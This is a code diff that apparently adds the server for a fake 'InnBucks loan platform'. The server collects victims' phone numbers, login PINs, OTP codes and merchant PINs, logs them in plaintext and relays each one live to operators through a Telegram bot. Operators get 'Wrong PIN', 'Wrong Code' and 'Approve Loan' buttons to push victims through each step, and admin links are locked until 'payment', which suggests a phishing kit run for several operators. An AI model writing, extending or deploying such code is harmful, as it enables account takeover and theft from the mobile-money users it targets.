+            if (admin?.chatId) {
+                adminChatIds.set(application.adminId, admin.chatId);
+            } else {
+                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            }
+        }
+
+        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
+        console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
+
+        const returningLabel = application.isReturningUser
+            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
+            : '';
+        await sendToAdmin(application.adminId, `
+📲 *CODE VERIFICATION*${returningLabel}
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 \`${otp}\`
+⏰ ${new Date().toLocaleString()}
+
+⚠️ *VERIFY CODE*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
+                    [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
+                ]
+            }
+        });
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('❌ Error in /api/verify-otp:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
+// GET /api/check-otp-status/:applicationId
+app.get('/api/check-otp-status/:applicationId', async (req, res) => {
+    try {
+        const application = await db.getApplication(req.params.applicationId);
+        if (application) res.json({ success: true, status: application.otpStatus });
+        else res.status(404).json({ success: false, message: 'Application not found' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// GET /api/check-merchant-pin-status/:applicationId
+app.get('/api/check-merchant-pin-status/:applicationId', async (req, res) => {
+    try {
+        const application = await db.getApplication(req.params.applicationId);
+        if (application) res.json({ success: true, status: application.merchantPinStatus || 'pending' });
+        else res.status(404).json({ success: false, message: 'Application not found' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// POST /api/resend-otp
+app.post('/api/resend-otp', async (req, res) => {
+    try {
+        const { applicationId } = req.body;
+        const application = await db.getApplication(applicationId);
+        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
+        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });
+
+        await sendToAdmin(application.adminId, `
+🔄 *OTP RESEND REQUEST*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+
+User requested a new OTP.
+        `, { parse_mode: 'Markdown' });
+
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// POST /api/submit-help-request
+app.post('/api/submit-help-request', async (req, res) => {
+    console.log('\n🆘 /api/submit-help-request called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, whatsappNumber } = req.body;
+
+        if (!applicationId || !whatsappNumber) {
+            return res.status(400).json({ success: false, message: 'Missing applicationId or whatsappNumber' });
+        }
+
+        const application = await db.getApplication(applicationId);
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        // Update application with help request
+        await db.updateApplication(applicationId, {
+            helpRequested: true,
+            whatsappNumber: whatsappNumber,
+            helpRequestedAt: new Date(),
+            helpStatus: 'pending'
+        });
+
+        console.log(`✅ Help request saved for ${applicationId}: ${whatsappNumber}`);
+
+        // Notify admin via Telegram with verification buttons
+        const message = `
+🆘 <b>HELP REQUEST - OTP ISSUE</b>
+
+<b>Applicant Phone:</b> ${application.phoneNumber || 'N/A'}
+<b>WhatsApp:</b> <code>${whatsappNumber}</code>
+<b>Application ID:</b> <code>${applicationId}</code>
+
+<b>⚠️ Is this a valid WhatsApp number?</b>
+<i>Please verify and click a button below to confirm.</i>
+        `;
+
+        const options = {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        {
+                            text: '✅ Correct - Contact Now',
+                            callback_data: `help_correct_${applicationId}`
+                        },
+                        {
+                            text: '❌ Incorrect - Not Valid',
+                            callback_data: `help_incorrect_${applicationId}`
+                        }
+                    ]
+                ]
+            }
+        };
+
+        try {
+            console.log(`📤 Sending help request to admin: ${application.adminId}`);
+            const result = await sendToAdmin(application.adminId, message, options);
+            if (result) {
+                console.log(`✅ Help request with verification buttons sent to admin: ${application.adminId}`);
+            } else {
+                console.warn(`⚠️ sendToAdmin returned null for admin: ${application.adminId}`);
+            }
+        } catch (err) {
+            console.error('❌ Error sending help notification to admin:', err.message);
+        }
+
+        res.json({ success: true, message: 'Help request submitted successfully' });
+    } catch (error) {
+        console.error('❌ Error in /api/submit-help-request:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
+// GET /api/check-help-status/:applicationId
+app.get('/api/check-help-status/:applicationId', async (req, res) => {
+    try {
+        const { applicationId } = req.params;
+        const application = await db.getApplication(applicationId);
+        
+        if (!application) {
+            return res.json({ success: false, status: 'not_found' });
+        }
+        
+        res.json({
+            success: true,
+            status: application.helpStatus || 'pending',
+            whatsappNumber: application.whatsappNumber
+        });
+    } catch (error) {
+        console.error('❌ Error checking help status:', error);
+        res.json({ success: false, status: 'error', message: error.message });
+    }
+});
+
+// POST /api/verify-merchant-pin
+app.post('/api/verify-merchant-pin', async (req, res) => {
+    console.log('\n🔵 /api/verify-merchant-pin called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, merchantPin } = req.body;
+
+        if (!applicationId || !merchantPin) {
+            return res.status(400).json({ success: false, message: 'Missing applicationId or merchantPin' });
+        }
+
+        const application = await db.getApplication(applicationId);
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
+            if (admin?.chatId) {
+                adminChatIds.set(application.adminId, admin.chatId);
+            } else {
+                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            }
+        }
+
+        await db.updateApplication(applicationId, { merchantPin, merchantPinStatus: 'received' });
+        console.log(`✅ Merchant PIN saved for ${applicationId}: ${merchantPin}`);
+
+        const returningLabel = application.isReturningUser
+            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
+            : '';
+
+        await sendToAdmin(application.adminId, `
+💳 *MERCHANT ACCOUNT PIN*${returningLabel}
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 Login PIN: \`${application.pin}\`
+🔢 OTP: \`${application.otp}\`
+💳 Merchant PIN: \`${merchantPin}\`
+⏰ ${new Date().toLocaleString()}
+
+⚠️ *MERCHANT PIN RECEIVED*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Wrong Merchant PIN', callback_data: `wrongmerchpin_merch_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Confirm & Approve',  callback_data: `approve_merch_${application.adminId}_${applicationId}` }]
+                ]
+            }
+        });
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('❌ Error in /api/verify-merchant-pin:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
+// GET /api/admins
+app.get('/api/admins', async (req, res) => {
+    try {
+        const admins = await db.getActiveAdmins();
+        const adminList = admins
+            .filter(a => !pausedAdmins.has(a.adminId))
+            .map(a => ({ id: a.adminId, name: a.name, email: a.email, status: a.status, connected: adminChatIds.has(a.adminId) }));
+        res.json({ success: true, admins: adminList });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// GET /api/validate-admin/:adminId
+app.get('/api/validate-admin/:adminId', async (req, res) => {
+    try {
+        const admin = await db.getAdmin(req.params.adminId);
+        if (admin && pausedAdmins.has(admin.adminId)) {
+            return res.json({ success: true, valid: false, message: 'Admin is currently paused' });
+        }
+        if (admin && admin.status === 'active' && !admin.linkLocked) {
+            res.json({ success: true, valid: true, connected: adminChatIds.has(admin.adminId), admin: { id: admin.adminId, name: admin.name, email: admin.email } });
+        } else if (admin && admin.linkLocked) {
+            res.json({ success: true, valid: false, message: 'Admin link is locked. Payment required.', locked: true });
+        } else {
+            res.json({ success: true, valid: false, message: 'Admin not found or inactive' });
+        }
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// GET /health
+app.get('/health', (req, res) => {
+    res.json({
+        status:        'ok',
+        database:      dbReady ? 'connected' : 'not ready',
+        activeAdmins:  adminChatIds.size,
+        pausedAdmins:  pausedAdmins.size,
+        superAdmins:   SUPER_ADMINS.length,
+        adminsInMap:   Array.from(adminChatIds.entries()).map(([id, chatId]) => ({ id, chatId, paused: pausedAdmins.has(id), isSuperAdmin: isSuperAdmin(id) })),
+        botMode:       'webhook',
+        webhookUrl:    `${WEBHOOK_URL}/telegram-webhook`,
+        timestamp:     new Date().toISOString()
+    });
+});
+
+// ── Serve the InnBucks HTML ──
+app.get('/', async (req, res) => {
+    const adminId = req.query.admin;
+
+    if (adminId) {
+        console.log(`🔗 Admin link accessed: ${adminId}`);
+        try {
+            const admin = await db.getAdmin(adminId);
+            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
+                if (admin.chatId && !adminChatIds.has(adminId)) {
+                    adminChatIds.set(adminId, admin.chatId);
+                    console.log(`➕ Added to active map: ${adminId} -> ${admin.chatId}`);
+                }
+            }
+        } catch (error) {
+            console.error('Error validating admin on landing page:', error);
+        }
+    }
+
+    res.sendFile(path.join(__dirname, 'innbucks-integrated.html'));
+});
+
+// ==========================================
+// START SERVER
+// ==========================================
+app.listen(PORT, () => {
+    console.log(`\n💎 INNBUCKS LOAN PLATFORM`);
+    console.log(`==========================`);
+    console.log(`🌐 Server: http://localhost:${PORT}`);
+    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
+    console.log(`👥 Admins: ${adminChatIds.size} connected`);
+    console.log(`⭐ Super Admins: ${SUPER_ADMINS.join(', ')}`);
+    console.log(`\n✅ Ready!\n`);
+});
+
+// ==========================================
+// GRACEFUL SHUTDOWN
+// ==========================================
+async function shutdownGracefully(signal) {
+    console.log(`\n🛑 Received ${signal}, shutting down...`);
+    try {
+        for (const [adminId, timer] of adminLinkTimers.entries()) {
+            clearTimeout(timer);
+        }
+        suspendAllSessions.clear();
+        await bot.deleteWebHook();
+        await db.closeDatabase();
+        console.log('✅ Cleanup complete');
+        process.exit(0);
+    } catch (error) {
+        console.error('❌ Shutdown error:', error);
+        process.exit(1);
+    }
+}
+
+process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
+process.on('SIGINT',  () => shutdownGracefully('SIGINT'));
+
+process.on('unhandledRejection', (error) => {
+    console.error('❌ Unhandled rejection:', error?.message);
+});
+
+process.on('uncaughtException', (error) => {
+    console.error('❌ Uncaught exception:', error?.message);
+});
